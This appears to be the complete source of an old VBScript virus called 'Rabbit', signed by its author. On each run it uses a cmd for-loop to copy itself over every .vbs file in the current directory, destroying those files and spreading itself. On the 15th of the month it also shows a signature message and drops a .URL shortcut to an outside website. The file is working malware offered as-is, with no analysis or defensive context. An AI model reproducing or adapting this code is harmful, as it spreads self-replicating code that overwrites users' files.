'Rabbit
'Copyright 28 Dicembre 1999 By Bomba_a_man

Set WshShell = Wscript.CreateObject("Wscript.Shell")

CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")

WshShell.Run (CommandPath & " /c for %%a in (*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul")

If Day(Now()) = 15 Then

WScript.Echo "Rabbit" & Chr(13) & "By Bomba_a_man"

Set oUrlLink = WshShell.CreateShortcut("The InGEN_Coorporation.URL")
oUrlLink.TargetPath = "http://www.Assembler.com"
oUrlLink.Save

End If
